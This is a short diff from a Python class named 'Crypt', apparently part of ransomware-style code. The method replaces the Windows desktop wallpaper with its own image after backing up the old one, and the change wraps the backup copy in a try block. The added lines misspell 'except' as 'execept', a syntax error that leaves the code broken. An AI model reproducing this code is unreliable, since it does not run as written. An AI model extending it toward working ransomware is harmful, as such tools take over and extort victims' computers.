@@ -57,7 +57,10 @@ class Crypt:
         # Change the user's desktop background and stores the old in Themes folder
         src = appdata+'/Microsoft/Windows/Themes/TranscodedWallpaper'
         dst = appdata+'/Microsoft/Windows/Themes/OldTranscodedWallpaper'
-        copyfile(src, dst)
+        try:
+            copyfile(src, dst)
+        execept FileNotFoundError:
+            pass
         windll.user32.SystemParametersInfoW(20, 0, self.background, 0)
         return 0
 
